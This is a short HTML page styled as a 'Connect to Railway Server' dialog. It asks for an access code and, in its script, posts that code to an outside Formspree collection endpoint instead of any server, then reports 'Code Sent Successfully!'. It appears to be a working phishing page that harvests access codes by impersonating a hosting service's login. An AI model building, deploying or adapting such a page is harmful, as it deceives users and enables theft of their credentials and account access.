<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Server Access</title>
  <style>
    body {
      background: linear-gradient(135deg, #1e1e2f, #2d2d44);
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .dialog {
      background-color: #2a2a40;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
      text-align: center;
      width: 300px;
    }

    h2 {
      margin-bottom: 15px;
    }

    input[type="text"] {
      width: 90%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }

    button {
      background-color: #6c5ce7;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #5a4cc8;
    }

    .message {
      margin-top: 15px;
      font-size: 14px;
      color: #00ff90;
      display: none;
    }
  </style>
</head>
<body>
  <div class="dialog">
    <h2>Connect to Railway Server</h2>
    <form id="accessForm">
      <input type="text" id="accessCode" name="accessCode" placeholder="Enter Access Code" required />
      <button type="submit">Connect</button>
      <div class="message" id="statusMessage">✅ Code Sent Successfully!</div>
    </form>
  </div>

  <script>
    const form = document.getElementById("accessForm");
    const message = document.getElementById("statusMessage");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const accessCode = document.getElementById("accessCode").value;

      const response = await fetch("https://formspree.io/f/meokonvl", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({ accessCode })
      });

      if (response.ok) {
        message.style.display = "block";
        form.reset();
      } else {
        alert("❌ Failed to send. Try again later.");
      }
    });
  </script>
</body>
</html>
